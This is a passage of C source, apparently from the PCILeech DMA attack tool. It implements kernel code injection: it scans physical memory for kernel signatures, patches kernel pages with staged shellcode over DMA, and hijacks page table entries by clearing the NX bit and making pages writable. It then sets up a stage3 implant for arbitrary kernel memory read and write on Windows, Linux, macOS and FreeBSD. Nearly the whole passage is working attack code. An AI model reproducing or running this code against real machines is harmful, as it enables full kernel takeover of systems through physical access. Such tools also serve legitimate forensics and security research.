	qwMaxMemoryAddress += phKMD->pPhysicalMap[phKMD->cPhysicalMap - 1].NumberOfBytes;
	if(pCfg->qwAddrMax > qwMaxMemoryAddress) {
		pCfg->qwAddrMax = qwMaxMemoryAddress - 1;
	}
	if(pCfg->fVerbose) {
		KMD_PhysicalMemoryMapDisplay(phKMD);
	}
	return TRUE;
}

BOOL KMD_SetupStage3(_In_ PCONFIG pCfg, _In_ PDEVICE_DATA pDeviceData, _In_ DWORD dwPhysicalAddress, _In_ PBYTE pbStage3, _In_ DWORD cbStage3)
{
	PKMDHANDLE pKMD = NULL;
	//------------------------------------------------
	// 1: Set up kernel module shellcode (stage3)
	//------------------------------------------------
	if(dwPhysicalAddress == 0xffffffff) {
		printf("KMD: Failed. Stage2 shellcode error.\n");
		return FALSE;
	}
	DeviceWriteDMA(pDeviceData, dwPhysicalAddress + 0x1000, pbStage3, cbStage3, 0);
	if(!(pKMD = LocalAlloc(LMEM_ZEROINIT, sizeof(KMDHANDLE)))) { return FALSE; }
	pKMD->dwPageAddr32 = dwPhysicalAddress;
	pKMD->status = (PKMDDATA)pKMD->pbPageData;
	DeviceReadDMA(pDeviceData, pKMD->dwPageAddr32, pKMD->pbPageData, 4096, 0);
	//------------------------------------------------
	// 2: Retrieve physical memory range map and complete open action.
	//------------------------------------------------
	if(!KMD_GetPhysicalMemoryMap(pCfg, pDeviceData, pKMD)) {
		printf("KMD: Failed. Failed to retrieve physical memory map.\n");
		LocalFree(pKMD);
		return FALSE;
	}
	pDeviceData->KMDHandle = (HANDLE)pKMD;
	pCfg->qwKMD = pKMD->dwPageAddr32;
	return TRUE;
}

BOOL KMDReadMemory_DMABufferSized(_In_ PDEVICE_DATA pDeviceData, _In_ QWORD qwAddress, _Out_ PBYTE pb, _In_ DWORD cb)
{
	BOOL result;
	PKMDHANDLE phKMD = (PKMDHANDLE)pDeviceData->KMDHandle;
	if(!KMD_IsRangeInPhysicalMap(phKMD, qwAddress, cb) && !pDeviceData->IsAllowedAccessReservedAddress) {
		return FALSE;
	}
	phKMD->status->_size = cb;
	phKMD->status->_address = qwAddress;
	result = KMD_SubmitCommand(NULL, pDeviceData, phKMD, KMD_CMD_VOID);
	if(!result) { return FALSE; }
	result = KMD_SubmitCommand(NULL, pDeviceData, phKMD, KMD_CMD_READ);
	if(!result) { return FALSE; }
	return DeviceReadDMA(pDeviceData, phKMD->status->DMAAddrPhysical, pb, cb, 0) && phKMD->status->_result;
}

BOOL KMDWriteMemory_DMABufferSized(_In_ PDEVICE_DATA pDeviceData, _In_ QWORD qwAddress, _In_ PBYTE pb, _In_ DWORD cb)
{
	BOOL result;
	PKMDHANDLE phKMD = (PKMDHANDLE)pDeviceData->KMDHandle;
	if(!KMD_IsRangeInPhysicalMap(phKMD, qwAddress, cb) && !pDeviceData->IsAllowedAccessReservedAddress) { return FALSE; }
	result = DeviceWriteDMA(pDeviceData, phKMD->status->DMAAddrPhysical, pb, cb, 0);
	if(!result) { return FALSE; }
	phKMD->status->_size = cb;
	phKMD->status->_address = qwAddress;
	result = KMD_SubmitCommand(NULL, pDeviceData, phKMD, KMD_CMD_VOID);
	if(!result) { return FALSE; }
	return KMD_SubmitCommand(NULL, pDeviceData, phKMD, KMD_CMD_WRITE) && phKMD->status->_result;
}

BOOL KMDReadMemory(_In_ PDEVICE_DATA pDeviceData, _In_ QWORD qwAddress, _Out_ PBYTE pb, _In_ DWORD cb)
{
	DWORD dwDMABufferSize = (DWORD)((PKMDHANDLE)pDeviceData->KMDHandle)->status->DMASizeBuffer;
	DWORD o = cb;
	dwDMABufferSize = dwDMABufferSize ? dwDMABufferSize : 0x01000000;
	while(TRUE) {
		if(o <= dwDMABufferSize) {
			return KMDReadMemory_DMABufferSized(pDeviceData, qwAddress + cb - o, pb + cb - o, o);
		} else if(!KMDReadMemory_DMABufferSized(pDeviceData, qwAddress + cb - o, pb + cb - o, dwDMABufferSize)) {
			return FALSE;
		}
		o -= dwDMABufferSize;
	}
}

BOOL KMDWriteMemory(_In_ PDEVICE_DATA pDeviceData, _In_ QWORD qwAddress, _Out_ PBYTE pb, _In_ DWORD cb)
{
	DWORD dwDMABufferSize = (DWORD)((PKMDHANDLE)pDeviceData->KMDHandle)->status->DMASizeBuffer;
	DWORD o = cb;
	dwDMABufferSize = dwDMABufferSize ? dwDMABufferSize : 0x01000000;
	while(TRUE) {
		if(o <= dwDMABufferSize) {
			return KMDWriteMemory_DMABufferSized(pDeviceData, qwAddress + cb - o, pb + cb - o, o);
		} else if(!KMDWriteMemory_DMABufferSized(pDeviceData, qwAddress + cb - o, pb + cb - o, dwDMABufferSize)) {
			return FALSE;
		}
		o -= dwDMABufferSize;
	}
}

VOID KMDClose(_In_ PDEVICE_DATA pDeviceData)
{
	PKMDHANDLE phKMD;
	if(pDeviceData->KMDHandle) {
		phKMD = (PKMDHANDLE)pDeviceData->KMDHandle;
		KMD_SubmitCommand(NULL, pDeviceData, phKMD, KMD_CMD_TERMINATE);
		LocalFree(pDeviceData->KMDHandle);
		pDeviceData->KMDHandle = NULL;
	}
}

BOOL KMDOpen_MemoryScan(_In_ PCONFIG pCfg, _In_ PDEVICE_DATA pDeviceData)
{
	SIGNATURE oSignatures[CONFIG_MAX_SIGNATURES];
	PSIGNATURE pSignature;
	DWORD dwSignatureMatchIdx, cSignatures = CONFIG_MAX_SIGNATURES;
	HRESULT hr;
	KMDHANDLE_S12 h1, h2;
	PDWORD pdwPhysicalAddress;
	//------------------------------------------------
	// 1: Load signature
	//------------------------------------------------
	if(0 == _stricmp(pCfg->szKMDName, "LINUX_X64")) {
		if(!KMD_LinuxKernelSeekSignature(pCfg, pDeviceData, &oSignatures[0])) {
			printf("KMD: Failed. Error locating generic linux kernel signature.\n");
			return FALSE;
		}
		pSignature = &oSignatures[0];
	} else if((0 == _stricmp(pCfg->szKMDName, "MACOS")) || (0 == _stricmp(pCfg->szKMDName, "OSX_X64"))) {
		if(!KMD_MacOSKernelSeekSignature(pCfg, pDeviceData, &oSignatures[0])) {
			printf("KMD: Failed. Error locating generic macOS kernel signature.\n");
			return FALSE;
		}
		pSignature = &oSignatures[0];
	} else if(0 == _stricmp(pCfg->szKMDName, "FREEBSD_X64")) {
		if(!KMD_FreeBSDKernelSeekSignature(pCfg, pDeviceData, &oSignatures[0])) {
			printf("KMD: Failed. Error locating generic FreeBSD kernel signature.\n");
			return FALSE;
		}
		pSignature = &oSignatures[0];
	} else {
		if(!Util_LoadSignatures(pCfg->szKMDName, ".kmd", oSignatures, &cSignatures, 5)) {
			printf("KMD: Failed. Error loading signatures.\n");
			return FALSE;
		}
		//------------------------------------------------
		// 2: Locate patch location (scan memory).
		//------------------------------------------------
		hr = KMD_FindSignature1(pCfg, pDeviceData, oSignatures, cSignatures, &dwSignatureMatchIdx);
		if(FAILED(hr)) {
			printf("KMD: Failed. Could not find signature in memory.\n");
			return FALSE;
		}
		pSignature = &oSignatures[dwSignatureMatchIdx];
	}
	if(!pSignature->chunk[2].cb || !pSignature->chunk[3].cb) {
		printf("KMD: Failed. Error loading shellcode.\n");
		return FALSE;
	}
	//------------------------------------------------
	// 3: Set up patch data.
	//------------------------------------------------
	h1.dwPageAddr32 = (DWORD)pSignature->chunk[0].qwAddress;
	h2.dwPageAddr32 = (DWORD)pSignature->chunk[1].qwAddress;
	h1.dwPageOffset = 0xfff & pSignature->chunk[2].cbOffset;
	h2.dwPageOffset = 0xfff & pSignature->chunk[3].cbOffset;
	DeviceReadDMA(pDeviceData, h1.dwPageAddr32, h1.pbOrig, 4096, PCILEECH_MEM_FLAG_RETRYONFAIL);
	DeviceReadDMA(pDeviceData, h2.dwPageAddr32, h2.pbOrig, 4096, PCILEECH_MEM_FLAG_RETRYONFAIL);
	memcpy(h1.pbPatch, h1.pbOrig, 4096);
	memcpy(h2.pbPatch, h2.pbOrig, 4096);
	memcpy(h1.pbPatch + h1.dwPageOffset, pSignature->chunk[2].pb, pSignature->chunk[2].cb);
	memcpy(h2.pbPatch + h2.dwPageOffset, pSignature->chunk[3].pb, pSignature->chunk[3].cb);
	// patch jump offset in stage1
	*(PDWORD)(h1.pbPatch + h1.dwPageOffset + STAGE1_OFFSET_CALL_ADD) += pSignature->chunk[3].cbOffset - pSignature->chunk[2].cbOffset;
	// patch original stage1 data in stage2 (needed for stage1 restore)
	memcpy(h2.pbPatch + h2.dwPageOffset + STAGE2_OFFSET_FN_STAGE1_ORIG, h1.pbOrig + h1.dwPageOffset, 8);
	// patch offset to extra function relative to stage2 entry point: windows = n/a, linux=kallsyms_lookup_name, mac=kernel_mach-o_header
	*(PDWORD)(h2.pbPatch + h2.dwPageOffset + STAGE2_OFFSET_EXTRADATA1) = pSignature->chunk[4].cbOffset - pSignature->chunk[3].cbOffset;
	//------------------------------------------------
	// 4: Write patched data to memory.
	//------------------------------------------------
	if(!DeviceWriteDMAVerify(pDeviceData, h2.dwPageAddr32, h2.pbPatch, 4096, PCILEECH_MEM_FLAG_RETRYONFAIL)) {
		printf("KMD: Failed. Signature found but unable write #2.\n");
		return FALSE;
	}
	if(!DeviceWriteDMA(pDeviceData, h1.dwPageAddr32, h1.pbPatch, 4096, 0)) { // stage1 (must be written after stage2)
		printf("KMD: Failed. Signature found but unable write #1.\n");
		return FALSE;
	}
	printf("KMD: Code inserted into the kernel - Waiting to receive execution.\n");
	//------------------------------------------------
	// 5: wait for patch to reveive execution.
	//------------------------------------------------
	pdwPhysicalAddress = (PDWORD)(h2.pbLatest + h2.dwPageOffset + STAGE2_OFFSET_STAGE3_PHYSADDR);
	do {
		Sleep(100);
		if(!DeviceReadDMA(pDeviceData, h2.dwPageAddr32, h2.pbLatest, 4096, PCILEECH_MEM_FLAG_RETRYONFAIL)) {
			printf("KMD: Failed. DMA Read failed while waiting to receive physical address.\n");
			return FALSE;
		}
	} while(!*pdwPhysicalAddress);
	printf("KMD: Execution received - continuing ...\n");
	//------------------------------------------------
	// 6: Restore hooks to original.
	//------------------------------------------------
	DeviceWriteDMA(pDeviceData, h2.dwPageAddr32, h2.pbOrig, 4096, 0);
	//------------------------------------------------
	// 7: Set up kernel module shellcode (stage3) and finish.
	//------------------------------------------------
	return KMD_SetupStage3(pCfg, pDeviceData, *pdwPhysicalAddress, pSignature->chunk[4].pb, 4096);
}

BOOL KMDOpen_PageTableHijack(_In_ PCONFIG pCfg, _In_ PDEVICE_DATA pDeviceData)
{
	QWORD qwCR3 = pCfg->qwCR3;
	QWORD qwModuleBase;
	SIGNATURE oSignatures[CONFIG_MAX_SIGNATURES];
	PSIGNATURE pSignature;
	DWORD cSignatures = CONFIG_MAX_SIGNATURES;
	KMDHANDLE_S12 h1, h2;
	PSIGNATUREPTE pSignaturePTEs;
	QWORD cSignaturePTEs;
	PDWORD pdwPhysicalAddress;
	BOOL result;
	//------------------------------------------------
	// 1: Load signature and patch data.
	//------------------------------------------------
	result = Util_LoadSignatures(pCfg->szKMDName, ".kmd", oSignatures, &cSignatures, 6);
	if(!result) {
		printf("KMD: Failed. Error loading signatures.\n");
		return FALSE;
	}
	if(cSignatures != 1) {
		printf("KMD: Failed. Singature count differs from 1. Exactly one signature must be loaded.\n");
		return FALSE;
	}
	pSignature = &oSignatures[0];
	if(pSignature->chunk[0].cb != 4096 || pSignature->chunk[1].cb != 4096) {
		printf("KMD: Failed. Signatures in PTE mode must be 4096 bytes long.\n");
		return FALSE;
	}
	pSignaturePTEs = (PSIGNATUREPTE)pSignature->chunk[5].pb;
	cSignaturePTEs = pSignature->chunk[5].cb / sizeof(SIGNATUREPTE);
	//------------------------------------------------
	// 2: Locate patch location PTEs.
	//------------------------------------------------
	if(pCfg->fPageTableScan) {
		printf("KMD: Searching for PTE location ...\n");
	}
	result = Util_PageTable_FindSignatureBase(pCfg, pDeviceData, &qwCR3, pSignaturePTEs, cSignaturePTEs, &qwModuleBase);
	if(!result) {
		printf("KMD: Failed. Could not find module base by PTE search.\n");
		return FALSE;
	}
	result = Util_PageTable_ReadPTE(pCfg, pDeviceData, qwCR3, qwModuleBase + pSignature->chunk[2].cbOffset, &h1.qwPTEOrig, &h1.qwPTEAddrPhys);
	if(!result) {
		printf("KMD: Failed. Could not access PTE #1.\n");
		return FALSE;
	}
	result = Util_PageTable_ReadPTE(pCfg, pDeviceData, qwCR3, qwModuleBase + pSignature->chunk[3].cbOffset, &h2.qwPTEOrig, &h2.qwPTEAddrPhys);
	if(!result) {
		printf("KMD: Failed. Could not access PTE #2.\n");
		return FALSE;
	}
	//------------------------------------------------
	// 3: Set up patch data.
	//------------------------------------------------
	// hijack "random" page in memory if target page is above 4GB - dangerous!!!
	h1.dwPageAddr32 = (h1.qwPTEOrig < 0x100000000) ? (h1.qwPTEOrig & 0xfffff000) : 0x90000;
	h2.dwPageAddr32 = (h2.qwPTEOrig < 0x100000000) ? (h2.qwPTEOrig & 0xfffff000) : 0x91000;
	h1.dwPageOffset = 0xfff & pSignature->chunk[2].cbOffset;
	h2.dwPageOffset = 0xfff & pSignature->chunk[3].cbOffset;
	memcpy(h1.pbPatch, pSignature->chunk[0].pb, 4096);
	memcpy(h2.pbPatch, pSignature->chunk[1].pb, 4096);
	memcpy(h1.pbPatch + h1.dwPageOffset, pSignature->chunk[2].pb, pSignature->chunk[2].cb);
	memcpy(h2.pbPatch + h2.dwPageOffset, pSignature->chunk[3].pb, pSignature->chunk[3].cb);
	// patch jump offset in stage1
	*(PDWORD)(h1.pbPatch + h1.dwPageOffset + STAGE1_OFFSET_CALL_ADD) += pSignature->chunk[3].cbOffset - pSignature->chunk[2].cbOffset;
	// patch original stage1 data in stage2 (needed for stage1 restore)
	memcpy(h2.pbPatch + h2.dwPageOffset + STAGE2_OFFSET_FN_STAGE1_ORIG, pSignature->chunk[0].pb + h1.dwPageOffset, 8);
	// patch offset to extra function relative to stage2 entry point: windows = n/a, linux=kallsyms_lookup_name
	*(PDWORD)(h2.pbPatch + h2.dwPageOffset + STAGE2_OFFSET_EXTRADATA1) = pSignature->chunk[4].cbOffset - pSignature->chunk[3].cbOffset;
	// calculate new PTEs
	h1.qwPTE = 0x7ff0000000000fff & h1.qwPTEOrig; // Strip NX-bit and previous physical address
	h2.qwPTE = 0x7ff0000000000fff & h2.qwPTEOrig; // Strip NX-bit and previous physical address
	h1.qwPTE |= 0x00000002; // set write
	h2.qwPTE |= 0x00000002; // set write
	h1.qwPTE |= 0xfffff000 & h1.dwPageAddr32;
	h2.qwPTE |= 0xfffff000 & h2.dwPageAddr32;
	//------------------------------------------------
	// 4: Write patched data and PTEs to memory.
	//------------------------------------------------
	DeviceReadDMA(pDeviceData, h1.dwPageAddr32, h1.pbOrig, 4096, 0);
	DeviceReadDMA(pDeviceData, h2.dwPageAddr32, h2.pbOrig, 4096, 0);
	if(!DeviceWriteDMAVerify(pDeviceData, h2.dwPageAddr32, h2.pbPatch, 4096, PCILEECH_MEM_FLAG_RETRYONFAIL) ||
		!DeviceWriteDMAVerify(pDeviceData, h1.dwPageAddr32, h1.pbPatch, 4096, PCILEECH_MEM_FLAG_RETRYONFAIL)) {
		printf("KMD: Failed. Signature found but unable write.\n");
		return FALSE;
	}
	DeviceWriteDMA(pDeviceData, h2.qwPTEAddrPhys, (PBYTE)&h2.qwPTE, sizeof(QWORD), 0);
	Sleep(250);
	DeviceWriteDMA(pDeviceData, h1.qwPTEAddrPhys, (PBYTE)&h1.qwPTE, sizeof(QWORD), 0);
	//------------------------------------------------
	// 5: wait for patch to reveive execution.
	//------------------------------------------------
	printf("KMD: Page Table hijacked - Waiting to receive execution.\n");
	pdwPhysicalAddress = (PDWORD)(h2.pbLatest + h2.dwPageOffset + STAGE2_OFFSET_STAGE3_PHYSADDR);
	do {
		Sleep(100);
		if(!DeviceReadDMA(pDeviceData, h2.dwPageAddr32, h2.pbLatest, 4096, PCILEECH_MEM_FLAG_RETRYONFAIL)) {
			printf("KMD: Failed. DMA Read failed while waiting to receive physical address.\n");
			return FALSE;
		}
	} while(!*pdwPhysicalAddress);
	printf("KMD: Execution received - continuing ...\n");
	//------------------------------------------------
	// 6: Restore hijacked memory pages.
	//------------------------------------------------
	DeviceWriteDMA(pDeviceData, h1.qwPTEAddrPhys, (PBYTE)&h1.qwPTEOrig, sizeof(QWORD), 0);
	DeviceWriteDMA(pDeviceData, h2.qwPTEAddrPhys, (PBYTE)&h2.qwPTEOrig, sizeof(QWORD), 0);
	Sleep(100);
	DeviceWriteDMA(pDeviceData, h1.dwPageAddr32, h1.pbOrig, 4096, 0);
	DeviceWriteDMA(pDeviceData, h2.dwPageAddr32, h2.pbOrig, 4096, 0);
	//------------------------------------------------
	// 7: Set up kernel module shellcode (stage3) and finish.
	//------------------------------------------------
	return KMD_SetupStage3(pCfg, pDeviceData, *pdwPhysicalAddress, pSignature->chunk[4].pb, 4096);
}

BOOL KMD_SetupStage3_FromPartial(_In_ PCONFIG pCfg, _In_ PDEVICE_DATA pDeviceData, _In_ PKMDHANDLE pPartialKMD)
{
	BYTE pb[4096];
	DWORD cb;
	if(pPartialKMD->status->OperatingSystem == KMDDATA_OPERATING_SYSTEM_LINUX) {
		return 
			Util_ParseHexFileBuiltin("DEFAULT_LINUX_X64_STAGE3", pb, 4096, &cb) &&
			KMD_SetupStage3(pCfg, pDeviceData, pPartialKMD->dwPageAddr32, pb, 4096);
	} else {
		printf("KMD: Failed. Not a valid KMD @ address: 0x%08x\n", pPartialKMD->dwPageAddr32);
		return FALSE;
	}
}

BOOL KMDOpen_LoadExisting(_In_ PCONFIG pCfg, _In_ PDEVICE_DATA pDeviceData)
{
	PKMDHANDLE pKMD = NULL;
	//------------------------------------------------
	// 1: Set up handle to existing shellcode
	//------------------------------------------------
	if(!(pKMD = LocalAlloc(LMEM_ZEROINIT, sizeof(KMDHANDLE)))) { goto fail; }
	pKMD->dwPageAddr32 = (DWORD)pCfg->qwKMD;
	pKMD->status = (PKMDDATA)pKMD->pbPageData;
	if(!DeviceReadDMA(pDeviceData, pKMD->dwPageAddr32, pKMD->pbPageData, 4096, PCILEECH_MEM_FLAG_RETRYONFAIL)) {
		printf("KMD: Failed. Read failed @ address: 0x%08x\n", pKMD->dwPageAddr32);
		goto fail;
	}
	if(pKMD->status->MAGIC == KMDDATA_MAGIC_PARTIAL) {
		return KMD_SetupStage3_FromPartial(pCfg, pDeviceData, pKMD);
	}
	if(pKMD->status->MAGIC != KMDDATA_MAGIC) {
		printf("KMD: Failed. Not a valid KMD @ address: 0x%08x\n", pKMD->dwPageAddr32);
		goto fail;
	}
	//------------------------------------------------ 
	// 2: Retrieve physical memory range map and complete open action.
	//------------------------------------------------
	if(!KMD_GetPhysicalMemoryMap(pCfg, pDeviceData, pKMD)) {
		printf("KMD: Failed. Failed to retrieve physical memory map.\n");
		goto fail;
	}
	pDeviceData->KMDHandle = (HANDLE)pKMD;
	return TRUE;
fail:
	if(pKMD) { LocalFree(pKMD); }
	return FALSE;
}

BOOL KMDOpen(_In_ PCONFIG pCfg, _In_ PDEVICE_DATA pDeviceData)
{
	if(pCfg->qwKMD) {
		return KMDOpen_LoadExisting(pCfg, pDeviceData);
	} else if(pCfg->qwCR3 || pCfg->fPageTableScan) {
		return KMDOpen_PageTableHijack(pCfg, pDeviceData);
	} else if(0 == _stricmp(pCfg->szKMDName, "WIN10_X64")) {
		return KMDOpen_HalHijack(pCfg, pDeviceData);
	} else if(0 == _stricmp(pCfg->szKMDName, "LINUX_X64_EFI")) {
		return KMDOpen_LinuxEfiRuntimeServicesHijack(pCfg, pDeviceData);
	} else {
		return KMDOpen_MemoryScan(pCfg, pDeviceData);
	}
}
